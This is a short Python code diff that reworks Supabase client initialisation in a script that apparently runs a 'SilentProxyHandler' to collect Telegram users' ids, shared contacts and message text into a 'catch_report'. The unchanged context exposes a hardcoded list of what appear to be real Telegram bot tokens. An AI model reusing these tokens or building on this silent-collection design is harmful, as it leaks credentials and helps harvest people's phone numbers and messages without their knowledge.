@@ -6,7 +6,18 @@ from supabase import create_client, Client
 
 SUPABASE_URL = os.environ.get("SUPABASE_URL", "YOUR_SUPABASE_URL")
 SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "YOUR_SUPABASE_KEY")
-supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY) if SUPABASE_URL != "YOUR_SUPABASE_URL" else None
+
+
+supabase = None
+try:
+    if SUPABASE_URL and SUPABASE_URL != "YOUR_SUPABASE_URL" and SUPABASE_URL.startswith("http"):
+        supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
+        print("[+] Supabase client initialized successfully.")
+    else:
+        print("[!] Supabase credentials not configured. Running in local-only storage mode.")
+except Exception as e:
+    print("[-] Warning: Failed to initialize Supabase client:", e)
+    supabase = None
 
 tokens = [
     "9268850834:AAGrE75Gl5U7I4PsmTJldceJ6i65pzFA8uQ",
@@ -35,7 +46,6 @@ class SilentProxyHandler(BaseHTTPRequestHandler):
             contact = message.get('contact', {}) if isinstance(message, dict) else {}
             text = message.get('text', '') if isinstance(message, dict) else ''
 
-           
             user_id_val = user.get('id')
             
             catch_report = {
